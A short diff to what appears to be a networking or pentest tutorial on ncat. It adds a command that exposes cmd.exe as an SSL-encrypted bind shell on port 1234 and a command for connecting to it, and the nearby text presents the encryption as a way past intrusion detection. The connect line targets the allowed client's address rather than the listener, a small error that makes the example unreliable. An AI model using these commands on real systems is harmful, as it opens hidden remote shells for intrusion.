@@ -132,3 +132,10 @@ Ncat is similar to nc in the aspect that ncat can also read and write data to TC
 But it has the ability to authenticate and encrypt incoming and outgoing connections.
 
 Authentication helps in avoiding any unwanted IP address to connect to our system and enryption helps in bypassing intrusion detection system(IDS).
+
+- ncat --exec cmd.exe --allow 192.168.1.10 -vnl 1234 --ssl
+
+Above command will open listening port 1234 and allow only host with ip address 192.168.1.10 to connect to it, data exchange will be encrypted with ssl encryption
+
+To connect to listener host:
+- ncat -v 192.168.1.10 1234 --ssl
